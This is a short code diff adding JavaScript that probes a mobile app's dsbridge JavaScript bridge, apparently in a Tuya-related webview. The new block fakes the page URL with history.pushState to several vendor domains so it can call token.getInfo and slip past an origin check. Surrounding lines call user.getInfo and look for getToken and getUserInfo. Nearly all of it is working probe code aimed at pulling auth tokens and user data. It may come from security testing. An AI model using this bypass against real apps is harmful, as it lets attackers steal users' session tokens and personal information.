@@ -23,6 +23,14 @@ if (typeof window._dsbridge !== 'undefined') {
     var r2 = window._dsbridge.call('user.getInfo','');
     log('user.getInfo → ' + r2);
   } catch(e){ log('user.getInfo err: ' + e); }
+  // 3. pushState 伪造 URL 绕过测试
+  ['https://www.tuya.com/','https://api.tuya.com/','https://a1-cn.iotwish.com/','https://smartapp.tuya.com/'].forEach(function(u){
+    try {
+      history.pushState({}, '', u);
+      var resp = window._dsbridge.call('token.getInfo','');
+      log('push[' + u + '] href=' + location.href.substring(0,30) + ' → ' + resp);
+    } catch(e){ log('push[' + u + '] err: ' + e); }
+  });
 }
 // 3. dsbridge 新版注入的 window.* 直接方法
 ['getToken','getUserInfo'].forEach(function(fn){
